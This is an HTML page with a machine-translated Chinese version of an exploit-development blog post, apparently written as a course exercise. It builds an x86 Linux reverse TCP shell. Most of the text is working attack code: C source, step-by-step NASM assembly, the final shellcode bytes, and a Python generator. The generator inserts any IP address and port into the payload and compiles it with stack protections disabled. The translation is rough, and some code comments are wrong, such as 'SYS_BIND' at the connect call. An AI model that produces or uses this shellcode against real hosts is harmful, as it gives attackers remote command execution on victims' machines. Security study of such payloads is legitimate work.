<html>
<head>
<title>[ExpDev] Reverse TCP Shell</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[ExpDev]反向TCP外壳</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-reverse-tcp-shell-227e94d1d6ee?source=collection_archive---------0-----------------------#2020-12-18">https://infosecwriteups.com/expdev-reverse-tcp-shell-227e94d1d6ee?source=collection_archive---------0-----------------------#2020-12-18</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><h1 id="e1cf" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated"><strong class="ak">什么是反壳？</strong></h1><p id="bc1a" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">与<a class="ae lm" href="https://medium.com/bugbountywriteup/expdev-bind-tcp-shellcode-cebb5657a997" rel="noopener">绑定外壳</a>相反，反向外壳通过在受害者系统上执行的有效负载连接回攻击者的计算机。当目标组织拥有强大的入站连接防火墙时，这种类型的shell更有用。反向外壳可以利用常见的出站端口，如端口80、443、53等。</p><figure class="lo lp lq lr gt ls gh gi paragraph-image"><div class="gh gi ln"><img src="../Images/8d2bde77370408bc7980d4b6ebf3d14a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1162/format:webp/1*aNtBQC4GG8klpMxvZ2_WuQ.png"/></div></figure><h1 id="6192" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated"><strong class="ak">套接字编程</strong></h1><p id="1ed0" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">类似于绑定TCP Shell练习，让我们用高级编程语言创建一个反向TCP Shell。我们将再次使用“c ”:</p><pre class="lo lp lq lr gt lv lw lx ly aw lz bi"><span id="c1f7" class="ma jr it lw b gy mb mc l md me">#include &lt;netinet/in.h&gt;<br/>#include &lt;stdio.h&gt;<br/>#include &lt;stdlib.h&gt;<br/>#include &lt;sys/socket.h&gt;<br/>#include &lt;unistd.h&gt;</span><span id="c141" class="ma jr it lw b gy mf mc l md me">int main()<br/>{<br/>    int sockfd;<br/>    int port = 9001;</span><span id="4333" class="ma jr it lw b gy mf mc l md me">    <strong class="lw iu">// Address struct</strong><br/>    struct sockaddr_in addr;<br/>    addr.sin_family = AF_INET;<br/>    addr.sin_port = htons(port);<br/>    addr.sin_addr.s_addr = inet_addr(“127.0.0.1”);</span><span id="d3d7" class="ma jr it lw b gy mf mc l md me">    <strong class="lw iu">// 1) Socket Syscall (sys_socket 1)</strong><br/>    sockfd = socket(AF_INET, SOCK_STREAM, 0);</span><span id="b7fe" class="ma jr it lw b gy mf mc l md me">    <strong class="lw iu">// 2) Connect Syscall</strong><br/>    connect(sockfd, (struct sockaddr *) &amp;addr, sizeof(addr));</span><span id="e397" class="ma jr it lw b gy mf mc l md me">   <strong class="lw iu"> // 3) Dup2 Syscall</strong><br/>    dup2(sockfd, 0); //stdin<br/>    dup2(sockfd, 1); //stdout<br/>    dup2(sockfd, 2); //stderr</span><span id="a174" class="ma jr it lw b gy mf mc l md me">    <strong class="lw iu">// 4) Execve Syscall</strong><br/>    execve(“/bin/sh”, NULL, NULL);<br/>    return 0;<br/>}</span></pre><p id="cbe1" class="pw-post-body-paragraph ko kp it kq b kr mg kt ku kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll im bi translated">我们来编译一下:</p><pre class="lo lp lq lr gt lv lw lx ly aw lz bi"><span id="66b8" class="ma jr it lw b gy mb mc l md me">gcc reverse-tcp-shell.c -o reverse-tcp-shell -w</span></pre><p id="8fe6" class="pw-post-body-paragraph ko kp it kq b kr mg kt ku kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll im bi translated">编译后的反向shell二进制可以像预期的那样成功连接回<code class="fe ml mm mn lw b">127.0.0.1:9001</code>。</p><figure class="lo lp lq lr gt ls gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi mo"><img src="../Images/5e2815666fc6a8252d495537824ec8bc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*k9pux17STGOKcmp3DguMbw.png"/></div></div></figure><h1 id="862b" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated"><strong class="ak">外壳代码</strong></h1><p id="bfd4" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">对于反向TCP Shell，我们需要遵循<code class="fe ml mm mn lw b">syscalls</code>:</p><ol class=""><li id="5b29" class="mt mu it kq b kr mg kv mh kz mv ld mw lh mx ll my mz na nb bi translated"><strong class="kq iu"> Socket </strong>:初始化Socket连接</li><li id="a80c" class="mt mu it kq b kr nc kv nd kz ne ld nf lh ng ll my mz na nb bi translated"><strong class="kq iu">连接</strong>:创建到给定地址的连接呼叫</li><li id="66eb" class="mt mu it kq b kr nc kv nd kz ne ld nf lh ng ll my mz na nb bi translated"><strong class="kq iu"> Dup2 </strong>:管理文件描述符的<code class="fe ml mm mn lw b">stdin</code>、<code class="fe ml mm mn lw b">stdout</code>和<code class="fe ml mm mn lw b">stderr</code>。这对于输入和输出重定向是必要的。</li><li id="a1c2" class="mt mu it kq b kr nc kv nd kz ne ld nf lh ng ll my mz na nb bi translated"><strong class="kq iu">执行</strong>:执行一个命令(<code class="fe ml mm mn lw b">/bin/sh</code>生成一个外壳)</li></ol><h2 id="061f" class="ma jr it bd js nh ni dn jw nj nk dp ka kz nl nm ke ld nn no ki lh np nq km nr bi translated"><strong class="ak">系统调用+函数调用</strong></h2><p id="981d" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">首先，我们需要收集<code class="fe ml mm mn lw b">socketcall()</code>和其他<code class="fe ml mm mn lw b">syscalls</code>的参数。</p><blockquote class="ns nt nu"><p id="1997" class="ko kp nv kq b kr mg kt ku kv mh kx ky nw mi lb lc nx mj lf lg ny mk lj lk ll im bi translated"><strong class="kq iu">注意</strong> : socketcall()是socket系统调用的一个公共内核入口点。</p></blockquote><p id="d52a" class="pw-post-body-paragraph ko kp it kq b kr mg kt ku kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll im bi translated">通过查询<code class="fe ml mm mn lw b">/usr/include/i386-linux-gnu/asm/unistd_32.h</code>，我们可以为<code class="fe ml mm mn lw b">syscalls</code>收集以下参数:</p><pre class="lo lp lq lr gt lv lw lx ly aw lz bi"><span id="006f" class="ma jr it lw b gy mb mc l md me">#define __NR_socketcall 102 → Hex: 0x66<br/>#define __NR_connect 362    → Hex: 0x16a<br/>#define __NR_dup2 63        → Hex: 0x3f<br/>#define __NR_execve 11      → Hex: 0xb</span></pre><p id="d175" class="pw-post-body-paragraph ko kp it kq b kr mg kt ku kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll im bi translated">此外，通过查看<code class="fe ml mm mn lw b">/usr/include/linux/net.h</code>，我们还可以获得函数调用的参数:</p><pre class="lo lp lq lr gt lv lw lx ly aw lz bi"><span id="d060" class="ma jr it lw b gy mb mc l md me"># cat /usr/include/linux/net.h | grep SYS</span><span id="6288" class="ma jr it lw b gy mf mc l md me">#define SYS_SOCKET 1 /* sys_socket(2) */<br/>#define SYS_BIND 2 /* sys_bind(2) */<br/>#define SYS_CONNECT 3 /* sys_connect(2) */<br/>#define SYS_LISTEN 4 /* sys_listen(2) */<br/>#define SYS_ACCEPT 5 /* sys_accept(2) */<br/>#define SYS_GETSOCKNAME 6 /* sys_getsockname(2) */<br/>#define SYS_GETPEERNAME 7 /* sys_getpeername(2) */<br/>#define SYS_SOCKETPAIR 8 /* sys_socketpair(2) */<br/>#define SYS_SEND 9 /* sys_send(2) */<br/>#define SYS_RECV 10 /* sys_recv(2) */<br/>#define SYS_SENDTO 11 /* sys_sendto(2) */<br/>#define SYS_RECVFROM 12 /* sys_recvfrom(2) */<br/>#define SYS_SHUTDOWN 13 /* sys_shutdown(2) */<br/>#define SYS_SETSOCKOPT 14 /* sys_setsockopt(2) */<br/>#define SYS_GETSOCKOPT 15 /* sys_getsockopt(2) */<br/>#define SYS_SENDMSG 16 /* sys_sendmsg(2) */<br/>#define SYS_RECVMSG 17 /* sys_recvmsg(2) */<br/>#define SYS_ACCEPT4 18 /* sys_accept4(2) */<br/>#define SYS_RECVMMSG 19 /* sys_recvmmsg(2) */<br/>#define SYS_SENDMMSG 20 /* sys_sendmmsg(2) */</span></pre><h2 id="62d5" class="ma jr it bd js nh ni dn jw nj nk dp ka kz nl nm ke ld nn no ki lh np nq km nr bi translated"><strong class="ak">初始化</strong></h2><p id="bc6f" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">首先，让我们将我们要使用的一些寄存器清零:</p><pre class="lo lp lq lr gt lv lw lx ly aw lz bi"><span id="13cf" class="ma jr it lw b gy mb mc l md me">global _start</span><span id="a1ac" class="ma jr it lw b gy mf mc l md me">section     .text</span><span id="c9c5" class="ma jr it lw b gy mf mc l md me">_start:</span><span id="61d4" class="ma jr it lw b gy mf mc l md me">xor eax, eax  ; Zero out EAX<br/>xor ebx, ebx  ; Zero out EBX<br/>xor ecx, ecx  ; Zero out ECX<br/>xor edx, edx  ; Zero out EDX</span></pre><h2 id="b032" class="ma jr it bd js nh ni dn jw nj nk dp ka kz nl nm ke ld nn no ki lh np nq km nr bi translated"><strong class="ak"> 1)插座()</strong></h2><p id="65b1" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">让我们创建<code class="fe ml mm mn lw b">socket()</code>外壳代码:</p><pre class="lo lp lq lr gt lv lw lx ly aw lz bi"><span id="91e3" class="ma jr it lw b gy mb mc l md me"><strong class="lw iu">; 1) Socket Creation</strong></span><span id="b2fe" class="ma jr it lw b gy mf mc l md me">mov al, 0x66  ; #define __NR_socketcall 102 → Hex: 0x66<br/>mov bl, 0x1   ; #define SYS_SOCKET 1<br/>push edx      ; int protocol = 0<br/>push ebx      ; int SOCK_STREAM = 1<br/>push 0x2      ; int AF_INET = 2<br/>mov ecx, esp  ; Move stack pointer to ECX<br/>int 0x80      ; Execute SYS_SOCKET<br/>mov edi, eax  ; Save the sockfd to EDI</span></pre><h2 id="d209" class="ma jr it bd js nh ni dn jw nj nk dp ka kz nl nm ke ld nn no ki lh np nq km nr bi translated"><strong class="ak">地址结构</strong></h2><p id="5cb2" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">让我们创建地址<code class="fe ml mm mn lw b">struct</code>外壳代码:</p><pre class="lo lp lq lr gt lv lw lx ly aw lz bi"><span id="ce69" class="ma jr it lw b gy mb mc l md me"><strong class="lw iu">; struct sockaddr_in addr;<br/>; addr.sin_family = AF_INET;<br/>; addr.sin_port = htons(port);<br/>; addr.sin_addr.s_addr = inet_addr(“127.0.0.1”);</strong></span><span id="0a82" class="ma jr it lw b gy mf mc l md me">push edx       ; NULL Padding<br/>push edx       ; NULL Padding<br/>xor eax, eax   ; Zero out EAX</span><span id="2476" class="ma jr it lw b gy mf mc l md me"><strong class="lw iu">; The return address 127.0.0.1 contains null-bytes which would break our shellcode. We can circumvent this by subtracting 1.1.1.1 from 128.1.1.2 to get the address of 127.0.0.1 eventually</strong></span><span id="707d" class="ma jr it lw b gy mf mc l md me">mov eax, 0x02010180  ; 2.1.1.128 (*Little-Endian)<br/>sub eax, 0x01010101  ; Subtract 1.1.1.1<br/>push eax             ; sin_addr = 127.0.0.1<br/>push word 0xb315     ; port = 5555 (*Little-Endian)<br/>push word 0x2        ; int AF_INET = 2<br/>mov esi, esp         ; Move stack pointer to ESI</span></pre><h2 id="fc4a" class="ma jr it bd js nh ni dn jw nj nk dp ka kz nl nm ke ld nn no ki lh np nq km nr bi translated"><strong class="ak"> 2)连接()</strong></h2><p id="4f4a" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">让我们创建地址<code class="fe ml mm mn lw b">connect()</code>外壳代码:</p><pre class="lo lp lq lr gt lv lw lx ly aw lz bi"><span id="b75c" class="ma jr it lw b gy mb mc l md me"><strong class="lw iu">; 2) Connect</strong></span><span id="7d23" class="ma jr it lw b gy mf mc l md me">xor eax, eax   ; Zero out EAX<br/>xor ebx, ebx   ; Zero out EBX<br/>mov al, 0x66   ; socketcall = 102 → Hex: 0x66<br/>mov bl, 0x3    ; #define SYS_CONNECT 3<br/>push 0x10      ; sizeof(addr) = 10<br/>push esi       ; ESI = Server Address struct<br/>push edi       ; EDI = sockfd<br/>mov ecx, esp   ; Move stack pointer to ECX<br/>int 0x80       ; Execute SYS_CONNECT</span></pre><h2 id="4c21" class="ma jr it bd js nh ni dn jw nj nk dp ka kz nl nm ke ld nn no ki lh np nq km nr bi translated"><strong class="ak"> 3) Dup2() </strong></h2><p id="1afa" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">让我们创建<code class="fe ml mm mn lw b">dup2()</code>外壳代码:</p><pre class="lo lp lq lr gt lv lw lx ly aw lz bi"><span id="86d2" class="ma jr it lw b gy mb mc l md me"><strong class="lw iu">; 3) Dup2 — Input and Output Redirection</strong></span><span id="ee43" class="ma jr it lw b gy mf mc l md me">xor ecx, ecx   ; Zero out<br/>mov cl, 0x3    ; Set the counter</span><span id="7b00" class="ma jr it lw b gy mf mc l md me">loop:<br/>xor eax, eax   ; Zero out EAX<br/>mov al, 0x3f   ; #define __NR_dup2 63 → Hex: 0x3f<br/>mov ebx, edi   ; New sockfd<br/>dec cl         ; Decrementing the counter by 1<br/>int 0x80</span><span id="b446" class="ma jr it lw b gy mf mc l md me">jnz loop       ; Jump back to the beginning of the loop until CL is set to zero flag</span></pre><h2 id="97a8" class="ma jr it bd js nh ni dn jw nj nk dp ka kz nl nm ke ld nn no ki lh np nq km nr bi translated"><strong class="ak"> 4) Execve() </strong></h2><p id="10f2" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">让我们创建<code class="fe ml mm mn lw b">execve()</code>外壳代码:</p><pre class="lo lp lq lr gt lv lw lx ly aw lz bi"><span id="1a7d" class="ma jr it lw b gy mb mc l md me"><strong class="lw iu">; 4) Execve</strong></span><span id="cc97" class="ma jr it lw b gy mf mc l md me">push edx          ; NULL<br/>push 0x68732f6e   ; “hs/n” ← //bin/sh<br/>push 0x69622f2f   ; “ib//”<br/>mov ebx, esp      ; Move stack pointer to EBX<br/>push edx          ; NULL terminator<br/>push ebx<br/>mov ecx, esp      ; Move stack pointer to ECX<br/>mov al, 0xb       ; #define __NR_execve 11 → Hex: 0xb<br/>int 0x80          ; Execute SYS_EXECVE</span></pre><h1 id="2de3" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated"><strong class="ak">最终外壳代码(reverse-tcp-shell.nasm) </strong></h1><p id="8abe" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">让我们把所有东西放在一起，测试外壳代码。</p><pre class="lo lp lq lr gt lv lw lx ly aw lz bi"><span id="d2d2" class="ma jr it lw b gy mb mc l md me">global _start</span><span id="eeb9" class="ma jr it lw b gy mf mc l md me">section     .text</span><span id="8d1e" class="ma jr it lw b gy mf mc l md me">_start:</span><span id="1781" class="ma jr it lw b gy mf mc l md me">xor eax, eax  ; Zero out EAX<br/>xor ebx, ebx  ; Zero out EBX<br/>xor ecx, ecx  ; Zero out ECX<br/>xor edx, edx  ; Zero out EDX</span><span id="f7bb" class="ma jr it lw b gy mf mc l md me"><strong class="lw iu">; 1) Socket Creation</strong></span><span id="4e3f" class="ma jr it lw b gy mf mc l md me">mov al, 0x66  ; #define __NR_socketcall 102 → Hex: 0x66<br/>mov bl, 0x1   ; #define SYS_SOCKET 1<br/>push edx      ; int protocol = 0<br/>push ebx      ; int SOCK_STREAM = 1<br/>push 0x2      ; int AF_INET = 2<br/>mov ecx, esp  ; Move stack pointer to ECX<br/>int 0x80      ; Execute SYS_SOCKET<br/>mov edi, eax  ; Save the sockfd to EDI</span><span id="9135" class="ma jr it lw b gy mf mc l md me"><strong class="lw iu">; struct sockaddr_in addr;<br/>; addr.sin_family = AF_INET;<br/>; addr.sin_port = htons(port);<br/>; addr.sin_addr.s_addr = inet_addr(“127.0.0.1”);</strong></span><span id="e83b" class="ma jr it lw b gy mf mc l md me">push edx       ; NULL Padding<br/>push edx       ; NULL Padding<br/>xor eax, eax   ; Zero out EAX</span><span id="4bc9" class="ma jr it lw b gy mf mc l md me"><strong class="lw iu">; The return address 127.0.0.1 contains null-bytes which would break our shellcode. We can circumvent this by subtracting 1.1.1.1 from 128.1.1.2 to get the address of 127.0.0.1 eventually</strong></span><span id="b1e2" class="ma jr it lw b gy mf mc l md me">mov eax, 0x02010180  ; 2.1.1.128 (*Little-Endian)<br/>sub eax, 0x01010101  ; Subtract 1.1.1.1<br/>push eax             ; sin_addr = 127.0.0.1<br/>push word 0xb315     ; port = 5555 (*Little-Endian)<br/>push word 0x2        ; int AF_INET = 2<br/>mov esi, esp         ; Move stack pointer to ESI</span><span id="883d" class="ma jr it lw b gy mf mc l md me"><strong class="lw iu">; 2) Connect</strong></span><span id="fe1a" class="ma jr it lw b gy mf mc l md me">xor eax, eax   ; Zero out EAX<br/>xor ebx, ebx   ; Zero out EBX<br/>mov al, 0x66   ; socketcall = 102 → Hex: 0x66<br/>mov bl, 0x3    ; #define SYS_CONNECT 3<br/>push 0x10      ; sizeof(addr) = 10<br/>push esi       ; ESI = Server Address struct<br/>push edi       ; EDI = sockfd<br/>mov ecx, esp   ; Move stack pointer to ECX<br/>int 0x80       ; Execute SYS_BIND</span><span id="f0b5" class="ma jr it lw b gy mf mc l md me"><strong class="lw iu">; 3) Dup2 — Input and Output Redirection</strong></span><span id="db43" class="ma jr it lw b gy mf mc l md me">xor ecx, ecx   ; Zero out<br/>mov cl, 0x3    ; Set the counter</span><span id="30db" class="ma jr it lw b gy mf mc l md me">loop:<br/>xor eax, eax   ; Zero out EAX<br/>mov al, 0x3f   ; #define __NR_dup2 63 → Hex: 0x3f<br/>mov ebx, edi   ; New sockfd<br/>dec cl         ; Decrementing the counter by 1<br/>int 0x80</span><span id="bc8a" class="ma jr it lw b gy mf mc l md me">jnz loop       ; Jump back to the beginning of the loop until CL is set to zero flag</span><span id="58a1" class="ma jr it lw b gy mf mc l md me"><strong class="lw iu">; 4) Execve</strong></span><span id="e0f8" class="ma jr it lw b gy mf mc l md me">push edx          ; NULL<br/>push 0x68732f6e   ; “hs/n” ← //bin/sh<br/>push 0x69622f2f   ; “ib//”<br/>mov ebx, esp      ; Move stack pointer to EBX<br/>push edx          ; NULL terminator<br/>push ebx<br/>mov ecx, esp      ; Move stack pointer to ECX<br/>mov al, 0xb       ; #define __NR_execve 11 → Hex: 0xb<br/>int 0x80          ; Execute SYS_EXECVE</span></pre><h1 id="8866" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated"><strong class="ak">编译</strong></h1><p id="a857" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">我创建了一个简单的编译器<a class="ae lm" href="https://github.com/bigb0sss/ASM_Learning/blob/master/compilerX86.py" rel="noopener ugc nofollow" target="_blank">编译器X86.py </a>。使用它，我们可以:</p><ul class=""><li id="c7fa" class="mt mu it kq b kr mg kv mh kz mv ld mw lh mx ll nz mz na nb bi translated">将<code class="fe ml mm mn lw b">bind-tcp-shell.nasm</code>编译成二进制文件</li><li id="a9f6" class="mt mu it kq b kr nc kv nd kz ne ld nf lh ng ll nz mz na nb bi translated">从二进制文件中提取外壳代码来创建<code class="fe ml mm mn lw b">shellcode.c</code></li><li id="d482" class="mt mu it kq b kr nc kv nd kz ne ld nf lh ng ll nz mz na nb bi translated">使用<code class="fe ml mm mn lw b">gcc</code>将<code class="fe ml mm mn lw b">shellcode.c</code>编译成二进制文件</li></ul><pre class="lo lp lq lr gt lv lw lx ly aw lz bi"><span id="a3ea" class="ma jr it lw b gy mb mc l md me"># python compilerX86.py -f reverse-tcp-shell</span><span id="3d12" class="ma jr it lw b gy mf mc l md me">[+] Assemble: reverse-tcp-shell.nasm<br/>[+] Linking: reverse-tcp-shell.o<br/>[+] Shellcode: “\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x31\xc0\xb8\x80\x01\x01\x02\x2d\x01\x01\x01\x01\x50\x66\x68\x15\xb3\x66\x6a\x02\x89\xe6\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x6a\x10\x56\x57\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80”<br/>[+] Creating File: shellcode.c<br/>[+] Compiling Executable: shellcode<br/>[+] Enjoy!</span></pre><figure class="lo lp lq lr gt ls gh gi paragraph-image"><div class="gh gi oa"><img src="../Images/f12fbb2af2d4a1a0ffd841ba42348bb7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1378/format:webp/1*a7VX6u1gJOyNN-LKL4GY5w.png"/></div></figure><h1 id="5999" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated"><strong class="ak">最终触摸</strong></h1><p id="1b3e" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">最后，我创建了以下python脚本来更改用户输入的IP地址和端口号，并自动创建和编译<code class="fe ml mm mn lw b">C</code>二进制文件。</p><pre class="lo lp lq lr gt lv lw lx ly aw lz bi"><span id="6640" class="ma jr it lw b gy mb mc l md me"><strong class="lw iu"># </strong><a class="ae lm" href="https://github.com/bigb0sss/SLAE32/blob/master/Assignment-2/reverse-tcp-shell.py" rel="noopener ugc nofollow" target="_blank"><strong class="lw iu">reverse-tcp-shell.py</strong></a></span><span id="17bd" class="ma jr it lw b gy mf mc l md me">import sys<br/>import argparse<br/>import subprocess<br/>import string<br/>import socket</span><span id="b274" class="ma jr it lw b gy mf mc l md me">“”” Arguments “””<br/>parser = argparse.ArgumentParser(description = ‘[+] Reverse TCP Shell Generator’)<br/>parser.add_argument(‘-p’, ‘ — port’, help=’\tPort’)<br/>parser.add_argument(‘-ip’, ‘ — ipAddr’, help=’\tIP Address’)<br/>args = parser.parse_args()</span><span id="7c39" class="ma jr it lw b gy mf mc l md me">def error():<br/>    parser.print_help()<br/>    exit(1)</span><span id="46da" class="ma jr it lw b gy mf mc l md me">def exploit(ip, port):<br/>    # Reverse TCP Shell<br/>    shellcode1 = “\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2”<br/>    shellcode1+= “\\xb0\\x66\\xb3\\x01\\x52\\x53\\x6a\\x02”<br/>    shellcode1+= “\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x52”<br/>    shellcode1+= “\\x31\\xc0\\xb8”</span><span id="bf77" class="ma jr it lw b gy mf mc l md me">    # “\x80\x01\x01\x02” = IP 127.0.0.1 + 1.1.1.1<br/>    print “[INFO] Reverse Shell IP: “ + ip<br/>    ip = ip.split(“.”)<br/>    <br/>    # Adding 1 to each element in the ip array    <br/>    ip[:]=[int(i)+1 for i in ip] <br/><br/>    # First Octet of the IP Address<br/>    octet1 = hex(ip[0])<br/>    octet1 = octet1[2:]<br/>    if len(octet1) == 2:<br/>        octet1 = “\\x” + octet1<br/>    else:<br/>        octet1 = “\\x” + “%02x” % int(octet1)</span><span id="d089" class="ma jr it lw b gy mf mc l md me">    # Second Octet of the IP Address<br/>    octet2 = hex(ip[1])<br/>    octet2 = octet2[2:]<br/>    if len(octet2) == 2:<br/>        octet2 = “\\x” + octet2<br/>    else:<br/>        octet2 = “\\x” + “%02x” % int(octet2)</span><span id="7cee" class="ma jr it lw b gy mf mc l md me">    # Thrid Octet of the IP Address<br/>    octet3 = hex(ip[2])<br/>    octet3 = octet3[2:]<br/>    if len(octet3) == 2:<br/>        octet3 = “\\x” + octet3<br/>    else:<br/>        octet3 = “\\x” + “%02x” % int(octet3)</span><span id="99d3" class="ma jr it lw b gy mf mc l md me">    # Forth Octet of the IP Address<br/>    octet4 = hex(ip[3])<br/>    octet4 = octet4[2:]<br/>    if len(octet4) == 2:<br/>        octet4 = “\\x” + octet4<br/>    else:<br/>        octet4 = “\\x” + “%02x” % int(octet4)</span><span id="857d" class="ma jr it lw b gy mf mc l md me">    ipHex = octet1 + octet2 + octet3 + octet4<br/>    <br/>    # Subtracting 1.1.1.1 = Potential Nullbyte avoidance mechanism<br/>    shellcode2 = “\\x2d\\x01\\x01\\x01\\x01\\x50\\x66\\x68” </span><span id="3280" class="ma jr it lw b gy mf mc l md me">    # “\x15\xb3” = port 5555<br/>    print “[INFO] Reverse Shell Port: “ + port<br/>    port = hex(socket.htons(int(port)))<br/>    a = port[2:4]<br/>    b = port[4:]</span><span id="edd2" class="ma jr it lw b gy mf mc l md me">    if b == ‘’:<br/>        b = ‘0’<br/>    port = ‘\\x{0}\\x{1}’.format(b, a)</span><span id="a608" class="ma jr it lw b gy mf mc l md me">    shellcode3 = “\\x66\\x6a\\x02\\x89\\xe6\\x31\\xc0\\x31”<br/>    shellcode3+= “\\xdb\\xb0\\x66\\xb3\\x03\\x6a\\x10\\x56”<br/>    shellcode3+= “\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1”<br/>    shellcode3+= “\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe”<br/>    shellcode3+= “\\xc9\\xcd\\x80\\x75\\xf4\\x52\\x68\\x6e”<br/>    shellcode3+= “\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69”<br/>    shellcode3+= “\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b”<br/>    shellcode3+= “\\xcd\\x80”<br/>    <br/>    payload = shellcode1 + ipHex + shellcode2 + port + shellcode3</span><span id="0b58" class="ma jr it lw b gy mf mc l md me">    # Adding shellcode to shellcode.c<br/>    outShellcode = ‘’<br/>    outShellcode+= ‘#include&lt;stdio.h&gt;\n’<br/>    outShellcode+= ‘#include&lt;string.h&gt;\n’<br/>    outShellcode+= ‘\n’<br/>    outShellcode+= ‘unsigned char code[] = \ \n’<br/>    outShellcode+= ‘“{0}”;’.format(payload)<br/>    outShellcode+= ‘\n’<br/>    outShellcode+= ‘main()\n’<br/>    outShellcode+= ‘{\n’<br/>    outShellcode+= ‘printf(“Shellcode Length: %d”, strlen(code));\n’<br/>    outShellcode+= ‘\tint (*ret)() = (int(*)())code;\n’<br/>    outShellcode+= ‘\tret();\n’<br/>    outShellcode+= ‘}\n’</span><span id="f184" class="ma jr it lw b gy mf mc l md me">    # Creating shellcode.c<br/>    filename = “exploit.c”<br/>    outfile = open(filename, ‘w’)<br/>    outfile.write(outShellcode)<br/>    outfile.close()</span><span id="6021" class="ma jr it lw b gy mf mc l md me">    print “[INFO] Creating File: exploit.c”<br/>    # Compiling shellcode.c<br/>    subprocess.call([“gcc”, “-fno-stack-protector”, “-z”, “execstack”, filename, “-o”, “exploit”, “-w”])</span><span id="c333" class="ma jr it lw b gy mf mc l md me">    print “[INFO] Compiled Executable: exploit”</span><span id="7d85" class="ma jr it lw b gy mf mc l md me">if __name__ == “__main__”:<br/>    inputIP = args.ipAddr if args.ipAddr != None else error()<br/>    inputPort = args.port if args.port != None else error()<br/>    exploit(inputIP, inputPort)</span></pre><figure class="lo lp lq lr gt ls gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi ob"><img src="../Images/23330a61c8943a20d510963e32e4ccd5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7YWx2gsrZoRn9_QVnR2e-A.png"/></div></div></figure><p id="b47c" class="pw-post-body-paragraph ko kp it kq b kr mg kt ku kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll im bi translated">感谢阅读！</p></div></div>    
</body>
</html>